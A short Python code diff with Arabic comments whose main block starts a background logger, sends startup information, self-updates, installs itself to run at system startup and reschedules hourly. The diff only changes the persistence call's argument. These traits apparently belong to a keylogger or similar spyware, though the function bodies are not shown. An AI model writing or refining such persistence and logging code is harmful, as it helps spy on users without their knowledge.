@@ -323,5 +323,5 @@ if __name__ == "__main__":
     threading.Thread(target=start_logger, daemon=True).start()  # بدء اللوجر
     send_startup_info()  # إرسال إشعار عند تشغيل النظام
     update_script()  # تحديث السكربت في البداية
-    persist_script()  # حفظ السكربت ليعمل تلقائيًا عند بدء النظام
+    persist_script(os.path.basename(__file__))  # حفظ السكربت ليعمل تلقائيًا عند بدء النظام
     run_every_hour()  # تحديث السكربت كل ساعة
